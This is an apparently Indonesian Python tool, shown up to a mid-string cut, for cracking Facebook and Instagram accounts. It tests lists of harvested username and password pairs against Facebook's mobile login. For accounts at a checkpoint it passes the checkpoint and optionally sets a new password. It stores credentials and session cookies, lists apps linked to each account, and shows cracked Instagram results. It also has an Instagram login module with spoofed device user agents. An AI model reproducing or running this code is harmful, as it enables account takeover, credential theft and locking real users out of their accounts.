		jalan('%s[%s+%s] Total Akun %sOk : %s%s'%(P,M,P,H,P,str(len(ok))))
		jalan('%s[%s+%s] Total Akun %sCp : %s%s'%(P,M,P,K,P,str(len(cp))))
		print('%s[%s#%s] %s------------------------------------------------>'%(P,H,P,M));jeda(1)
		if len(cp)==0:
			exit()
		else:
			__Janda__Bohay__ = input('\n%s[%s?%s] Ingin langsung cek opsi akun? (y/n):%s '%(P,H,P,H))
			if __Janda__Bohay__ =='':
				print ('\n%s[%s!%s] Yang bener kontol'%(P,K,P));exit()
			elif __Janda__Bohay__ in['Y','y']:
				jalan("\n%s[%s+%s] Mode pesawat 3 detik terlebih dahulu "%(P,H,P));jeda(1)
				__Kontol__Tehyung__Buriq__ =input("%s[%s?%s] Ubah sandi ketika tap crot? (y/n):%s "%(P,H,P,H))
				if __Kontol__Tehyung__Buriq__ =='':
					print ('\n%s[%s!%s] Yang bener kontol'%(P,K,P));exit()
				elif __Kontol__Tehyung__Buriq__ in['y','Y']:
					ubah_pass.append("ubah_sandi")
					__Makan__Bang__=input("%s[%s?%s] Masukan sandi :%s "%(P,H,P,H))
					if len(__Makan__Bang__) <= 5:
						print ('\n%s[%s!%s] Sandi minimal 6 karakter bangsat '%(P,K,P));exit()
					else:
						pwbaru.append(pw2)
				nomor=0
				for fb in cp:
					akun = fb.replace("\n","")
					ngecek  = akun.split(" ◊ ")
					nomor+=1
					print("\n%s%s.%s cek login %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
					try:
						mengecek(ngecek[0].replace(" *--> ",""), ngecek[1])
					except requests.exceptions.ConnectionError:
						sys.stdout.write("\r%s[!] Tidak ada koneksi "%(M)),
						sys.stdout.flush();jeda(1)
						pass
					except:
						pass
				jalan("\n%s[%s✓%s] Selesai mengecek opsi akun"%(P,H,P))
				#os.popen('play-audio data/cek.mp3')
				input('%s[%s+%s] Tekan enter '%(P,H,P))
				pilihan().menu()
			elif __Janda__Bohay__ in['N','n']:
				pilihan().menu()
			else:
				print ('\n%s[%s!%s] Yang bener kontol'%(P,K,P));exit()
	else:
		exit(f"\n{P}[{H}+{P}] Awokawok ndak dapet hasil :v")

# CEK APLIKASI 
def cek_apk(kukis):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kukis}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s |__ Aktif [%s]. %s%s"%(P,i+1,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r%s |__ Cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kukis}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r %s|__ Kedaluwarsa [%s]. %s%s"%(P,i+1,Q,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r %s|__ Cookie invalid"%(M))

# MOCH AANG ARDIANSYAH XD.
def ngentot():
	CP = ("CP/")
	romi = input("\n%s[%s?%s] Nama file :%s "%(P,H,P,K))
	if romi == "":
		print ('\n%s[%s!%s] Yang bener kontol'%(P,K,P));jeda(1)
		ngentot()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit("\n%s[%s!%s] Nama file %s ndak ada tod "%(P,M,P,romi))
	jalan("%s[%s!%s] Mode pesawatkan terlebih dahulu 2 detik "%(P,M,P))
	pw=input("\n%s[%s?%s] Ganti sandi ketika tap crot? (y/n):%s "%(P,H,P,H))
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2 = input("%s[%s+%s] Masukan sandi baru :%s "%(P,H,P,H))
		if len(pw2) <= 5:
			print ('\n%s[%s!%s] Sandi minimal 6 karakter tod '%(P,M,P));jeda(1)
		else:
			pwbaru.append(pw2)
	print('%s[%s#%s] %s------------------------------------------------------------>'%(P,H,P,M));jeda(1)
	jalan("%s[%s+%s] Total akun checkpoin adalah : %s%s "%(P,H,P,K,str(len(file_cp))))
	print('%s[%s#%s] %s------------------------------------------------------------>%s'%(P,H,P,M,K));jeda(1)
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split(" ◊ ")
		nomor+=1
		print("\n%s%s.%s Cek login %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
		try:
			mengecek(ngecek[0].replace(" *--> ",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			continue
	print("\n%s[%s✓%s] Cek opsi selesai ... "%(P,H,P));jeda(0.07)
	#os.popen('play-audio data/cek.mp3')
	input('%s[%s!%s] Tekan Enter '%(P,H,P))
	pilihan().menu()
	
data = {}
data2 = {}

# CEK USER & PASSWORD
def mengecek(user,pw):
	global loop,ubah_pass,pwbaru
	session=requests.Session()
	url = "https://mbasic.facebook.com/"
	session.headers.update({"Host":"mbasic.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"})
	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post(url+link.get("action"),data=data)
	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r%s• akun terkunci sesi new"%(M))
		else:
			print("\r%s• akun tidak checkpoint, silahkan anda login "%(H))
			#os.popen('play-audio dapet.mp3')
			open('OK/%s.txt'%(waktu), 'a').write(" *--> %s ◊ %s\n" % (user,pw))
	elif "checkpoint" in session.cookies.get_dict():
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=bs4.BeautifulSoup(an.text,"html.parser")
		cek=[cek.text for cek in response2.find_all("option")]
		number=0
		print("\r%s%s%s terdapat %s%s%s opsi %s:"%(U,til,O,P,str(len(cek)),O,M));jeda(0.07)
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					dat,dat2={},{}
					but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
					for x in response("input"):
						if x.get("name") in but:
							dat.update({x.get("name"):x.get("value")})
					ubahPw=session.post(url+link2.get("action"),data=dat).text
					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
					link3=resUbah.find("form",{"method":"post"})
					but2=["submit[Next]","nh","fb_dtsg","jazoest"]
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						for b in resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						print("\r%s%s akun one tab, sandi berhasil di ubah \n *--> %s ◊ %s ◊ %s			"%(H,til,user,pwbaru[0],coki))
						#os.popen('play-audio dapet.mp3')
						open('OK/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s ◊ %s\n" % (user,pwbaru[0],coki))
						cek_apk(coki)
				else:
					print("\r%s%s akun tap crot, silahkan anda login di lite		"%(H,til))
					#os.popen('play-audio dapet.mp3')
					open('OK/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s ◊ %s\n" % (user,pw,coki))
					cek_apk(coki)
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r%s• akun terpasang autentikasi dua faktor !			"%(M))
			else:
				print("%s%s terjadi kesalahan"%(M,til))
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r%s• akun tidak checkpoint, silahkan anda login "%(H))
				#os.popen('play-audio dapet.mp3')
				open('OK/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s\n" % (user,pw))
		for opsi in range(len(cek)):
			number +=1
			jalan ("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s• %s"%(M,oh))
	else:
		print("%s%s login gagal, silahkan cek kembali id dan kata sandi"%(M,til))
		
#HAPUS HASIL
def hapus_hasil():
	os.system('rm -rf CP/*.txt && OK/*.txt')
	os.system('rm -rf IG/*.txt')
	print ('');jeda(2)
	jalan (H+'[✓] berhasil menghapus hasil crack ');jeda(2)
	pilihan().menu()
	
# CEK HASIL
def hasill():
	print ("\n%s[%s01%s]. Cek hasil akun %sOK "%(P,H,P,H))
	print ("%s[%s02%s]. Cek hasil akun %sCP "%(P,H,P,K))
	print ("%s[%s00%s]. Kembali ke menu "%(P,M,P))
	
def cek_cek(__Aang__Sayang__Laura__):
	if __Aang__Sayang__Laura__ in['']:
		print ('\n%s[%s!%s] Yang bener kontol'%(P,K,P));jeda(2)
		pilihan().menu()
	elif __Aang__Sayang__Laura__ in['1','01']:
		hasil_fb()
	elif __Aang__Sayang__Laura__ in['2','02']:
		hasil_igehh()
	elif __Aang__Sayang__Laura__ in['03','3']:
		hapus_hasil()
	elif __Aang__Sayang__Laura__ in['0','00']:
		pilihan().menu()
	else:
		print ('\n%s[%s!%s] Yang bener kontol'%(P,K,P));jeda(2)
		pilihan().menu()
		
# CEK HASIL FACEBOOK
def hasil_fb():
	hasill()
	__Memek__Mantan__ = input('\n%s[%s+%s] Pilih :%s '%(P,H,P,H))
	if __Memek__Mantan__ in['']:
		print("%s[%s!%s] Yang bener kontol "%(P,H,P));jeda(2)
		menu()
	elif __Memek__Mantan__ in['1','01']:
		dirs = os.listdir('OK')
		print ("\n%s[%s+%s] Hasil crack yang tersimpan\n"%(P,H,P))
		for file in dirs:
			print("%s[%s+%s] %s%s"%(P,H,P,H,file));jeda(0.07)
		try:
			file = input("\n%s[%s?%s] Masukan nama file :%s "%(P,H,P,H));jeda(0.2)
			if file in['']:
				print("%s[%s!%s] Yang bener kontol "%(P,H,P));exit()
			totalok = open('OK/%s'%(file)).read().splitlines()
		except (KeyError, IOError):
			print("%s[%s!%s] File ndak ada bangsat "%(P,H,P));jeda(2)
		nm_file = ('%s'%(file)).replace('-', ' ')
		file_nm = nm_file.replace('.txt', '')
		print('%s[%s#%s] %s------------------------------------------------------------>'%(P,H,P,M));jeda(1)
		jalan("%s[%s+%s] Hasil crack tanggal %s : %s%s %stotal %s: %s%s"%(P,H,P,M,H,file_nm,O,M,H,len(totalok)))
		print('%s[%s#%s] %s------------------------------------------------------------>%s'%(P,H,P,M,H));jeda(1)
		os.system('cat OK/%s'%(file));jeda(0.07)
		print('%s[%s#%s] %s------------------------------------------------------------>'%(P,H,P,M));exit()
	elif __Memek__Mantan__ in['2','02']:
		dirs = os.listdir('CP')
		print ("\n%s[%s+%s] Hasil crack yang tersimpan\n"%(P,H,P))
		for file in dirs:
			print("%s[%s+%s] %s%s"%(P,K,P,K,file));jeda(0.07)
		try:
			file = input("\n%s[%s?%s] Masukan nama file :%s "%(P,H,P,K));jeda(0.2)
			if file in['']:
				print("%s[%s!%s] Yang bener kontol "%(P,H,P));exit()
			totalcp = open('CP/%s'%(file)).read().splitlines()
		except (KeyError, IOError):
			print("%s[%s!%s] File ndak ada bangsat "%(P,H,P));jeda(2)
		nm_file = ('%s'%(file)).replace('-', ' ')
		file_nm = nm_file.replace('.txt', '')
		print('%s[%s#%s] %s------------------------------------------------------------>'%(P,H,P,M));jeda(1)
		jalan("%s[%s+%s] Hasil crack tanggal%s : %s%s %stotal %s: %s%s"%(P,H,P,M,H,file_nm,O,M,H,len(totalcp)))
		print('%s[%s#%s] %s------------------------------------------------------------>%s'%(P,H,P,M,K));jeda(1)
		os.system('cat CP/%s'%(file));jeda(0.07)
		print('%s[%s#%s] %s------------------------------------------------------------>'%(P,H,P,M));exit()
	elif __Memek__Mantan__ in['0','00']:
		pilihan().menu()
	else:
		print ('\n%s[%s!%s] Yang bener kontol'%(P,K,P));jeda(1)
		pilihan().menu()
		
# CEK HASIL IGEH
def hasil_igehh():
	print('')
	for i in os.listdir('IG'):
		print("%s•%s> %s%s"%(U,M,J,i));jeda(0.07)
	try:
		c=input("\n%s•%s masukan file %s:%s "%(U,O,M,K))
		if c in['']:
			exit("\n%s• isi yang benar kentod"%(M))
		g=open("IG/%s"%(c)).read().splitlines()
	except FileNotFoundError:
		exit("\n%s• file tidak tersedia"%(M))
	xx=c.split("-")
	xc=xx[0]
	print(" %s# %s------------------------------------------------------------>%s#"%(P,M,P));jeda(2)
	print('%s%s%s Total akun %s: %s%s '%(U,til,O,M,H,len(g)))
	print(" %s# %s------------------------------------------------------------>%s#"%(P,M,P));jeda(2)
	for s in g:
		usr=s.split("|")[0]
		pwd=s.split("|")[1]
		fol=s.split("|")[2]
		ful=s.split("|")[3]
		if xc=="CP":
			print(f"""{J}╔══[ {K}Checkpoint                      
{J}║══[ {K}Username  {M}> {K}{usr}{C}
{J}║══[ {K}Password  {M}> {K}{pwd}{C}
{J}║══[ {K}Followers {M}> {K}{fol}{C}
{J}╚══[ {K}Following {M}> {K}{ful}{C}
			""");jeda(0.05)
		else:
			print(f"""{J}╔══[ {H}Berhasil                      
{J}║══[ {H}Username  {M}> {H}{usr}{C}
{J}║══[ {H}Password  {M}> {H}{pwd}{C}
{J}║══[ {H}Followers {M}> {H}{fol}{C}
{J}╚══[ {H}Following {M}> {H}{ful}{C}
			""");jeda(0.05)

#----------------------------------------------#
#---{ CRACK INSTAGRAM }---#
#---------------------------------------------#
day=datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10

insta_log='https://www.instagram.com/accounts/login/?force_classic_login=&'
url='https://www.instagram.com'

USN="Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"

internal=[]
external=[]
success=[]
checkpoint=[]
loop=0
following=[]
s=requests.Session()

try:
    # python 2
	urllib_quote_plus = urllib.quote
except:
    # python 3
	urllib_quote_plus = urllib.parse.quote_plus

def cekAPI(cookie):
	user=open('.username','r').read()
	try:
		c=requests.get("https://www.instagram.com/%s/?__a=1"%(user),cookies={'cookie':cookie},headers={"user-agent":USN})
		i=c.json()["graphql"]["user"]
		nama=i["full_name"]
		followers=i["edge_followed_by"]["count"]
		following=i["edge_follow"]["count"]
		external.append(f'{nama}|{followers}|{following}')
	except ValueError:
		print(f'{M} ! Instagram Checkpoint');jeda(4)
		os.remove('.kukis.log')
		os.remove('.username')
		exit()
	return external,user

def checkin():
	try:
		kuki=open('.kukis.log','r').read()
	except FileNotFoundError:
		login()
	ex,user=cekAPI(kuki)
	cookie={'cookie':kuki}
	instagram(ex,user,cookie).menu()

def login():
	global external
	try:
		os.system('clear')
		catet_req = ('# Login dengan akun instagram anda dan pastikan akun bersifat publik. Jika login checkpoint wajib gunakan akun baru, buat akun baru lewat browser chrome')
		requ = rich.markdown.Markdown(catet_req, style='green')
		rich.console.Console().print(requ)
		us=input('%s%s %susername%s > %s'%(U,til,O,M,K))
		pw=stdiomask.getpass(prompt='%s%s %spassword%s > %s'%(U,til,O,M,K))
	except KeyboardInterrupt:
		exit('%s ! Terhenti '%(M))
		
	x=instagramAPI(us,pw).loginAPI()
	if x.get('status')=='success':
		open('.username','a').write(us)
		open('.kukis.log','a').write(x.get('cookie'))
		cookie={'cookie':x.get('cookie')}
		print ('\n%s%s Login berhasil √'%(H,til));jeda(2)
		checkin()
	elif x.get('status')=='checkpoint':
		exit ('\n%s%s Akun terkena sesi '%(M,til));jeda(2)
	else:
		exit ('\n%s%s Login gagal, silahkan coba lagi '%(M,til));jeda(2)

def User_Agent():
	dpi_phone = [
		'133','320','515','160','640','240','120'
		'800','480','225','768','216','1024']
	model_phone = [
		'Nokia 2.4','HUAWEI','Galaxy',
		'Unlocked Smartphones','Nexus 6P',
		'Mobile Phones','Xiaomi',
		'samsung','OnePlus']
	pxl_phone = [
		'623x1280','700x1245','800x1280',
		'1080x2340','1320x2400','1242x2688']
	i_version = [
		'114.0.0.20.2','114.0.0.38.120',
		'114.0.0.20.70','114.0.0.28.120',
		'114.0.0.0.24','114.0.0.0.41']
	User_Agent = f'Instagram '+random.choice(i_version)+' Android (30/3.0; '+random.choice(dpi_phone)+'dpi; '+random.choice(pxl_phone)+'; huawei/google; '+random.choice(model_phone)+'; angler; angler; en_US)'
	return User_Agent

def user_agent():
	resolutions = ['720x1280', '320x480', '480x800', '1024x768', '1280x720', '768x1024', '480x320']
	versions = ['GT-N7000', 'SM-N9000', 'GT-I9220', 'GT-I9100']
	dpis = ['120', '160', '320', '240']
	ver = random.choice(versions)
	dpi = random.choice(dpis)
	res = random.choice(resolutions)
	return (
		'Instagram 4.{}.{} '
		'Android ({}/{}.{}.{}; {}; {}; samsung; {}; {}; smdkc210; en_US)'
	).format(
		random.randint(1, 2),
		random.randint(0, 2),
		random.randint(10, 11),
		random.randint(1, 3),
		random.randint(3, 5),
		random.randint(0, 5),
		dpi,
		res,
		ver,
		ver,
	)

def user_agentAPI():
	APP_VERSION = "136.0.0.34.124"
	VERSION_CODE = "208061712"








	DEVICES = {
		"one_plus_7": {"app_version": APP_VERSION,"android_version": "29","android_release": "10.0","dpi": "420dpi","resolution": "1080x2340","manufacturer": "OnePlus","device": "GM1903","model": "OnePlus7","cpu": "qcom","version_code": VERSION_CODE},
		"one_plus_3": {"app_version": APP_VERSION,"android_version": "28","android_release": "9.0","dpi": "420dpi","resolution": "1080x1920","manufacturer": "OnePlus","device": "ONEPLUS A3003","model": "OnePlus3","cpu": "qcom","version_code": VERSION_CODE},
		"samsung_galaxy_s7": {"app_version": APP_VERSION,"android_version": "26","android_release": "8.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G930F","model": "herolte","cpu": "samsungexynos8890","version_code": VERSION_CODE},
		"huawei_mate_9_pro": {"app_version": APP_VERSION,"android_version": "24","android_release": "7.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "HUAWEI","device": "LON-L29","model": "HWLON","cpu": "hi3660","version_code": VERSION_CODE},
		"samsung_galaxy_s9_plus": {"app_version": APP_VERSION,"android_version": "28","android_release": "9.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G965F","model": "star2qltecs","cpu": "samsungexynos9810","version_code": VERSION_CODE},
		"one_plus_3t": {"app_version": APP_VERSION,"android_version": "26","android_release": "8.0","dpi": "380dpi","resolution": "1080x1920","manufacturer": "OnePlus","device": "ONEPLUS A3010","model": "OnePlus3T","cpu": "qcom","version_code": VERSION_CODE},
		"lg_g5": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2392","manufacturer": "LGE/lge","device": "RS988","model": "h1","cpu": "h1","version_code": VERSION_CODE},
		"zte_axon_7": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2560","manufacturer": "ZTE","device": "ZTE A2017U","model": "ailsa_ii","cpu": "qcom","version_code": VERSION_CODE},
		"samsung_galaxy_s7_edge": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G935","model": "hero2lte","cpu": "samsungexynos8890","version_code": VERSION_CODE},}
	DEFAULT_DEVICE = random.choice(list(DEVICES.keys()))
	app_version = DEVICES[DEFAULT_DEVICE]['app_version']
	android_version = DEVICES[DEFAULT_DEVICE]['android_version']
	android_release = DEVICES[DEFAULT_DEVICE]['android_release']
	dpi = DEVICES[DEFAULT_DEVICE]['dpi']
	resolution = DEVICES[DEFAULT_DEVICE]['resolution']
	manufacturer = DEVICES[DEFAULT_DEVICE]['manufacturer']
	device = DEVICES[DEFAULT_DEVICE]['device']
	model = DEVICES[DEFAULT_DEVICE]['model']
	cpu = DEVICES[DEFAULT_DEVICE]['cpu']
	version_code = DEVICES[DEFAULT_DEVICE]['version_code']
	USER_AGENT_BASE = f"Instagram {app_version} "+f"Android ({android_version}/{android_release}; "+f"{dpi}; {resolution}; {manufacturer}; "+f"{device}; {model}; {cpu}; en_US; {version_code})"
	return USER_AGENT_BASE

class instagramAPI:
	API_URL = 'https://i.instagram.com/api/v1/'
	DEVICE_SETTINTS = {'manufacturer': 'Xiaomi',
		'model': 'HM 1SW',
		'android_version': 18,
		'android_release': '4.3'}
	USER_AGENT = 'Instagram 10.26.0 Android ({android_version}/{android_release}; 320dpi; 720x1280; {manufacturer}; {model}; armani; qcom; en_US)'.format(**DEVICE_SETTINTS)
	IG_SIG_KEY = '4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178'
	EXPERIMENTS = 'ig_promote_reach_objective_fix_universe,ig_android_universe_video_production,ig_search_client_h1_2017_holdout,ig_android_live_follow_from_comments_universe,ig_android_carousel_non_square_creation,ig_android_live_analytics,ig_android_follow_all_dialog_confirmation_copy,ig_android_stories_server_coverframe,ig_android_video_captions_universe,ig_android_offline_location_feed,ig_android_direct_inbox_retry_seen_state,ig_android_ontact_invite_universe,ig_android_live_broadcast_blacklist,ig_android_insta_video_reconnect_viewers,ig_android_ad_async_ads_universe,ig_android_search_clear_layout_universe,ig_android_shopping_reporting,ig_android_stories_surface_universe,ig_android_verified_comments_universe,ig_android_preload_media_ahead_in_current_reel,android_instagram_prefetch_suggestions_universe,ig_android_reel_viewer_fetch_missing_reels_universe,ig_android_direct_search_share_sheet_universe,ig_android_business_promote_tooltip,ig_android_direct_blue_tab,ig_android_async_network_tweak_universe,ig_android_elevate_main_thread_priority_universe,ig_android_stories_gallery_nux,ig_android_instavideo_remove_nux_comments,ig_video_copyright_whitelist,ig_react_native_inline_insights_with_relay,ig_android_direct_thread_message_animation,ig_android_draw_rainbow_client_universe,ig_android_direct_link_style,ig_android_live_heart_enhancements_universe,ig_android_rtc_reshare,ig_android_preload_item_count_in_reel_viewer_buffer,ig_android_users_bootstrap_service,ig_android_auto_retry_post_mode,ig_android_shopping,ig_android_main_feed_seen_state_dont_send_info_on_tail_load,ig_fbns_preload_default,ig_android_gesture_dismiss_reel_viewer,ig_android_tool_tip,ig_android_ad_logger_funnel_logging_universe,ig_android_gallery_grid_column_count_universe,ig_android_business_new_ads_payment_universe,ig_android_direct_links,ig_android_audience_control,ig_android_live_encore_consumption_settings_universe,ig_perf_android_holdout,ig_android_cache_contact_import_list,ig_android_links_receivers,ig_android_ad_impression_backtest,ig_android_list_redesign,ig_android_stories_separate_overlay_creation,ig_android_stop_video_recording_fix_universe,ig_android_render_video_segmentation,ig_android_live_encore_reel_chaining_universe,ig_android_sync_on_background_enhanced_10_25,ig_android_immersive_viewer,ig_android_mqtt_skywalker,ig_fbns_push,ig_android_ad_watchmore_overlay_universe,ig_android_react_native_universe,ig_android_profile_tabs_redesign_universe,ig_android_live_consumption_abr,ig_android_story_viewer_social_context,ig_android_hide_post_in_feed,ig_android_video_loopcount_int,ig_android_enable_main_feed_reel_tray_preloading,ig_android_camera_upsell_dialog,ig_android_ad_watchbrowse_universe,ig_android_internal_research_settings,ig_android_search_people_tag_universe,ig_android_react_native_ota,ig_android_enable_concurrent_request,ig_android_react_native_stories_grid_view,ig_android_business_stories_inline_insights,ig_android_log_mediacodec_info,ig_android_direct_expiring_media_loading_errors,ig_video_use_sve_universe,ig_android_cold_start_feed_request,ig_android_enable_zero_rating,ig_android_reverse_audio,ig_android_branded_content_three_line_ui_universe,ig_android_live_encore_production_universe,ig_stories_music_sticker,ig_android_stories_teach_gallery_location,ig_android_http_stack_experiment_2017,ig_android_stories_device_tilt,ig_android_pending_request_search_bar,ig_android_fb_topsearch_sgp_fork_request,ig_android_seen_state_with_view_info,ig_android_animation_perf_reporter_timeout,ig_android_new_block_flow,ig_android_story_tray_title_play_all_v2,ig_android_direct_address_links,ig_android_stories_archive_universe,ig_android_save_collections_cover_photo,ig_android_live_webrtc_livewith_production,ig_android_sign_video_url,ig_android_stories_video_prefetch_kb,ig_android_stories_create_flow_favorites_tooltip,ig_android_live_stop_broadcast_on_404,ig_android_live_viewer_invite_universe,ig_android_promotion_feedback_channel,ig_android_render_iframe_interval,ig_android_accessibility_logging_universe,ig_android_camera_shortcut_universe,ig_android_use_one_cookie_store_per_user_override,ig_profile_holdout_2017_universe,ig_android_stories_server_brushes,ig_android_ad_media_url_logging_universe,ig_android_shopping_tag_nux_text_universe,ig_android_comments_single_reply_universe,ig_android_stories_video_loading_spinner_improvements,ig_android_collections_cache,ig_android_comment_api_spam_universe,ig_android_facebook_twitter_profile_photos,ig_android_shopping_tag_creation_universe,ig_story_camera_reverse_video_experiment,ig_android_direct_bump_selected_recipients,ig_android_ad_cta_haptic_feedback_universe,ig_android_vertical_share_sheet_experiment,ig_android_family_bridge_share,ig_android_search,ig_android_insta_video_consumption_titles,ig_android_stories_gallery_preview_button,ig_android_fb_auth_education,ig_android_camera_universe,ig_android_me_only_universe,ig_android_instavideo_audio_only_mode,ig_android_user_profile_chaining_icon,ig_android_live_video_reactions_consumption_universe,ig_android_stories_hashtag_text,ig_android_post_live_badge_universe,ig_android_swipe_fragment_container,ig_android_search_users_universe,ig_android_live_save_to_camera_roll_universe,ig_creation_growth_holdout,ig_android_sticker_region_tracking,ig_android_unified_inbox,ig_android_live_new_watch_time,ig_android_offline_main_feed_10_11,ig_import_biz_contact_to_page,ig_android_live_encore_consumption_universe,ig_android_experimental_filters,ig_android_search_client_matching_2,ig_android_react_native_inline_insights_v2,ig_android_business_conversion_value_prop_v2,ig_android_redirect_to_low_latency_universe,ig_android_ad_show_new_awr_universe,ig_family_bridges_holdout_universe,ig_android_background_explore_fetch,ig_android_following_follower_social_context,ig_android_video_keep_screen_on,ig_android_ad_leadgen_relay_modern,ig_android_profile_photo_as_media,ig_android_insta_video_consumption_infra,ig_android_ad_watchlead_universe,ig_android_direct_prefetch_direct_story_json,ig_android_shopping_react_native,ig_android_top_live_profile_pics_universe,ig_android_direct_phone_number_links,ig_android_stories_weblink_creation,ig_android_direct_search_new_thread_universe,ig_android_histogram_reporter,ig_android_direct_on_profile_universe,ig_android_network_cancellation,ig_android_background_reel_fetch,ig_android_react_native_insights,ig_android_insta_video_audio_encoder,ig_android_family_bridge_bookmarks,ig_android_data_usage_network_layer,ig_android_universal_instagram_deep_links,ig_android_dash_for_vod_universe,ig_android_modular_tab_discover_people_redesign,ig_android_mas_sticker_upsell_dialog_universe,ig_android_ad_add_per_event_counter_to_logging_event,ig_android_sticky_header_top_chrome_optimization,ig_android_rtl,ig_android_biz_conversion_page_pre_select,ig_android_promote_from_profile_button,ig_android_live_broadcaster_invite_universe,ig_android_share_spinner,ig_android_text_action,ig_android_own_reel_title_universe,ig_promotions_unit_in_insights_landing_page,ig_android_business_settings_header_univ,ig_android_save_longpress_tooltip,ig_android_constrain_image_size_universe,ig_android_business_new_graphql_endpoint_universe,ig_ranking_following,ig_android_stories_profile_camera_entry_point,ig_android_universe_reel_video_production,ig_android_power_metrics,ig_android_sfplt,ig_android_offline_hashtag_feed,ig_android_live_skin_smooth,ig_android_direct_inbox_search,ig_android_stories_posting_offline_ui,ig_android_sidecar_video_upload_universe,ig_android_promotion_manager_entry_point_universe,ig_android_direct_reply_audience_upgrade,ig_android_swipe_navigation_x_angle_universe,ig_android_offline_mode_holdout,ig_android_live_send_user_location,ig_android_direct_fetch_before_push_notif,ig_android_non_square_first,ig_android_insta_video_drawing,ig_android_swipeablefilters_universe,ig_android_live_notification_control_universe,ig_android_analytics_logger_running_background_universe,ig_android_save_all,ig_android_reel_viewer_data_buffer_size,ig_direct_quality_holdout_universe,ig_android_family_bridge_discover,ig_android_react_native_restart_after_error_universe,ig_android_startup_manager,ig_story_tray_peek_content_universe,ig_android_profile,ig_android_high_res_upload_2,ig_android_http_service_same_thread,ig_android_scroll_to_dismiss_keyboard,ig_android_remove_followers_universe,ig_android_skip_video_render,ig_android_story_timestamps,ig_android_live_viewer_comment_prompt_universe,ig_profile_holdout_universe,ig_android_react_native_insights_grid_view,ig_stories_selfie_sticker,ig_android_stories_reply_composer_redesign,ig_android_streamline_page_creation,ig_explore_netego,ig_android_ig4b_connect_fb_button_universe,ig_android_feed_util_rect_optimization,ig_android_rendering_controls,ig_android_os_version_blocking,ig_android_encoder_width_safe_multiple_16,ig_search_new_bootstrap_holdout_universe,ig_android_snippets_profile_nux,ig_android_e2e_optimization_universe,ig_android_comments_logging_universe,ig_shopping_insights,ig_android_save_collections,ig_android_l